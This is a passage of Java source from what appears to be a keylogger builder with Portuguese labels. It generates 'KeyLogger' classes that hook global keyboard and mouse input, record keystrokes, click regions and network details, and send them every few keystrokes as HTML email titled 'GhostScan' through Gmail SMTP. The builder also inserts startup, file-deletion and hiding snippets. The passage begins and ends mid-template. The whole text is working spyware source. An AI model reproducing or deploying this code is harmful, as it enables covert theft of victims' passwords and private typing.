					+"if(e.getKeyCode() == NativeKeyEvent.VC_ENTER){"
						+"var = "+'"'+"<br>"+'"'+";"
					+"}"
					
					+"if(e.getKeyCode() == NativeKeyEvent.VC_BACKSPACE){"
						+"var = "+'"'+"[backspace]"+'"'+";"
								+"}"
					
					+"if(e.getKeyCode() == NativeKeyEvent.VC_TAB){"
						+"var = "+'"'+"[tab]"+'"'+";"
								+"}"
					
					+"if(e.getKeyCode() == NativeKeyEvent.VC_COMMA){"
						+"var = "+'"'+","+'"'+";"
						+"}"
					
					+"if(e.getKeyCode() == NativeKeyEvent.VC_PERIOD){"
						+"var = "+'"'+"."+'"'+";"
						+"}"
					
					+"if(e.getKeyCode() == NativeKeyEvent.VC_UP){"
						+"var = "+'"'+"[cima]"+'"'+";"
								+"}"
					
					+"if(e.getKeyCode() == NativeKeyEvent.VC_DOWN){"
						+"var = "+'"'+"[baixo]"+'"'+";"
								+"}"
					
					+"if(e.getKeyCode() == NativeKeyEvent.VC_LEFT){"
						+"var = "+'"'+"[esquerda]"+'"'+";"
								+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_RIGHT){"
						+"var = "+'"'+"[direita]"+'"'+";"
								+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK){"
						+"var = "+'"'+"[capslock]"+'"'+";"
								+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_DELETE){"
						+"var = "+'"'+"[delete]"+'"'+";"
								+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_INSERT){"
						+"var = "+'"'+"[insert]"+'"'+";"
								+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_F24){"
						+"var = "+'"'+"+"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_F23){"
						+"var = "+'"'+"*"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_EQUALS){"
						+"var = "+'"'+"="+'"'+";"
						+"}"
					
					+"if(e.getKeyCode() == NativeKeyEvent.VC_SLASH){"
						+"var = "+'"'+"/"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_A){"
						+"var = "+'"'+"a"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_B){"
						+"var = "+'"'+"b"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_C){"
					+"var = "+'"'+"c"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_D){"
					+"var = "+'"'+"d"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_E){"
					+"var = "+'"'+"e"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_F){"
					+"var = "+'"'+"f"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_G){"
					+"var = "+'"'+"g"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_H){"
					+"var = "+'"'+"h"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_I){"
					+"var = "+'"'+"i"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_J){"
					+"var = "+'"'+"j"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_K){"
					+"var = "+'"'+"k"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_L){"
					+"var = "+'"'+"l"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_M){"
					+"var = "+'"'+"m"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_N){"
					+"var = "+'"'+"n"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_O){"
					+"var = "+'"'+"o"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_P){"
					+"var = "+'"'+"p"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_Q){"
					+"var = "+'"'+"q"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_R){"
					+"var = "+'"'+"r"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_S){"
					+"var = "+'"'+"s"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_T){"
					+"var = "+'"'+"t"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_U){"
					+"var = "+'"'+"u"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_V){"
					+"var = "+'"'+"v"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_W){"
					+"var = "+'"'+"w"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_X){"
					+"var = "+'"'+"x"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_Y){"
					+"var = "+'"'+"y"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_Z){"
					+"var = "+'"'+"z"+'"'+";"
					+"}";
						
						String codigoMouse = "package key;"
						+ "import java.awt.AWTException;"
						+ "import java.awt.Dimension;"
						+"import java.awt.Point;"
						+"import java.io.BufferedReader;"
						+"import java.io.BufferedWriter;"
						+"import java.io.File;"
						+"import java.io.FileWriter;"
						+"import java.awt.Rectangle;"
						+"import net.jimmc.jshortcut.JShellLink;"
						+"import java.awt.Robot;"
						+"import java.awt.Toolkit;"
						+"import java.awt.image.BufferedImage;"
						+"import java.io.BufferedReader;"
						+"import java.io.File;"
						+"import java.io.IOException;"
						+"import java.io.InputStreamReader;"
						+"import java.net.Inet4Address;"
						+"import java.net.InetAddress;"
						+"import java.net.InterfaceAddress;"
						+"import java.net.NetworkInterface;"
						+"import java.net.SocketException;"
						+"import java.net.URL;"
						+"import java.net.UnknownHostException;"
						+"import java.util.ArrayList;"
						+"import java.util.Enumeration;"
						+"import java.util.List;"
						+"import javax.imageio.ImageIO;"
						+"import org.apache.commons.mail.DefaultAuthenticator;"
						+"import org.apache.commons.mail.EmailAttachment;"
						+"import org.apache.commons.mail.EmailException;"
						+"import org.apache.commons.mail.HtmlEmail;"
						+"import org.jnativehook.GlobalScreen;"
						+"import org.jnativehook.NativeHookException;"
						+"import org.jnativehook.keyboard.NativeKeyEvent;"
						+"import org.jnativehook.keyboard.NativeKeyListener;"
						+"import org.jnativehook.mouse.NativeMouseEvent;"
						+"import org.jnativehook.mouse.NativeMouseInputListener;"
						+"import java.util.Date;"
						+"import java.text.DateFormat;"
						+"import java.text.SimpleDateFormat;"
						+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
						+"private static Point mou;"
						+"private static String mouse;"
							+"private static String var;"
							+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
							+"private static boolean click = false;"
							+"private static int numberKeys = 0;"
							
						+"private static String getDateTime() {"
						+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
						+"Date date = new Date();" 
						+"return dateFormat.format(date);" 
						+"}"
							
							+"private static String getIP(){"
							+"String ip = "+'"'+"Não definido"+'"'+";"
							+"try {"
									+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
										+"BufferedReader in = null;"        
						        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
						        	+"ip = in.readLine();"
						        	+"} catch (IOException e) {}"
						        +"return ip;"
						        +"}"
						        
							+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
							+"click = true;"
							+"}"
							
							+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
							+"click = true;"
							+"}"
							+"public void nativeMouseMoved(NativeMouseEvent es) {"
								
							+"}"
							
							+"public void nativeMouseClicked(NativeMouseEvent es) {"
								
							+"}"
							+"public void nativeKeyPressed(NativeKeyEvent e) {	"
							+"numberKeys = numberKeys + 1;"
								+conditionKey
								+"varchar += var;"
								+"}"
							
							+"public void nativeKeyReleased(NativeKeyEvent e) {"
								
							+"}"
							+"public void nativeKeyTyped(NativeKeyEvent e) {"
								
							+"}"
							+"public void nativeMousePressed(NativeMouseEvent es) {"
								
								
								+"mou = es.getPoint();"
								+"double positionx = mou.getX();"
								+"double positiony = mou.getY();"
								+"String position = null;"
								+"String position1 = null;"
								+"if(positionx < 70 & positiony < 70){"
									+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
									+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
									+"if(positionx < 170 & positiony > 600){"
									+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
									+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
								+"if(positionx < 170 & positiony > 190){"
									+"position = "+'"'+"lateral esquerda,"+'"'+";"
									+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
									+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
									+"position = "+'"'+"Centro da página,"+'"'+";"
									+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"			
								+"if(positionx > 270 & positiony > 400 & positionx < 400){"
									+"position = "+'"'+"Centro da página,"+'"'+";"
									+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
								+"if(positionx > 170 & positiony < 190){"
									+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
									+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
								+"if(positionx > 400 & positiony < 190){"
									+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
									+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
								
									
					+"}"
							
							
					+"public static void main(String[] args) throws EmailException, IOException{"
					+"new Thread(new Runnable(){"
					+"@Override "
					+"public void run(){"
						+"while(true){"		
						+"if(click || numberKeys == 5){"
						
									+"HtmlEmail email = new HtmlEmail();"
									+"try{"
									+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
									+"email.setSmtpPort(465);"
									+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
									+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+"email.setDebug(true);"
										+"email.setSSLOnConnect(true);"
								
										
										+"List list = new ArrayList();"
										
										+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
										
										+"InetAddress addr = null;"
										+"try {"
											+"addr = InetAddress.getLocalHost();"
											+"} catch (UnknownHostException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
									    +"byte[] ipAddr = addr.getAddress();"
									    +"String hostname = addr.getHostName();"
									    
										+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
									    
									    +"InetAddress localHost = null;"
									    +"try {"
									    +"localHost = Inet4Address.getLocalHost();"
									    +"} catch (UnknownHostException e1) {"
											
										+"e1.printStackTrace();"
										+"}"
									    +"NetworkInterface networkInterface = null;"
									    +"try {"
									    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
									    +"} catch (SocketException e1) {"
											
										+"e1.printStackTrace();"
										+"}"
									    
										+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
									    
										+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
									      
									      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
									      +"String infoRede = null;"
									      +"Enumeration ifaces = null;"
									      +"try {"
									      +"ifaces = NetworkInterface.getNetworkInterfaces();"
									      +"} catch (SocketException e1) {"


											+"e1.printStackTrace();"
											+"}"
											+"while (ifaces.hasMoreElements()) {"
											+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
											+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
											+"iface1 += face+"+'"'+"<br>"+'"'+";"
									        
									        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
									        +"{"
									        	
									+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
									          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
									          
									          
									          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
									        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
									          
									   
									          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
									        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
									        	  +"}"
									        
										
										+"}"
										
										
									      
									      
									     
									            
									        
										+"String getIp = getIP();"
										
								           
								+"StringBuilder builder = new StringBuilder();"
								+"builder.append("+'"'+"<html>"+'"'
												+'+'+'"'+"<body>"+'"'
												+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
												
												+'+'+'"'+"<p><font color='red'>O mouse foi clicado em: </font>"+'"'+"+mouse+"+'"'+"<br><br><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"</p>"+'"'
												+'+'+'"'+"</body>"+'"'
												+'+'+'"'+"</html>"+'"'+");"
												
												+"email.setMsg(builder.toString());"
										
											
												+"}"
												+"catch (EmailException e1) {"
												+"e1.printStackTrace();"
												+"}"  
									
									
									+"email.setSubject("+'"'+"GhostScan"+'"'+");"
									+"email.setSSL(true);"
									+"email.setAuthentication("+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
											+"try {"
										
					+"email.send();"
					+"}" 
					+"catch (EmailException e1) {"
					+"e1.printStackTrace();"
						+"}"
						+"numberKeys = 0;"
						+"click = false;"
						
					+"}"
						
					+"}"
					+"}"
					+"}).start();"
								
					+init		    
					+"Date date = new Date();"
					+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
					+delfile
					+ocult
					
					
								
							    
								
							+"try {"
							+"GlobalScreen.registerNativeHook();"
								+"} "
								+"catch (NativeHookException ex) {"

								+"System.err.println(ex.getMessage());"
									+"System.exit(1);"
									+"}"
									
									+"try {"
									
									+"global.registerNativeHook();"
									+"global.addNativeKeyListener(new KeyLogger());"
									+"global.addNativeMouseListener(new KeyLogger());"
									+"} catch (NativeHookException e) {"
										+"e.printStackTrace();"
									+"System.exit(1);"
									+"}"
								+"}"
								+"}";

					
					
					String codigo = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Robot;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
									+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
									+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"</p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"	
									
						+init	    
						+"Date date = new Date();"
						+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
						+delfile		    
						+ocult		
						
						
									
								    
									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoRegIp = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Robot;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
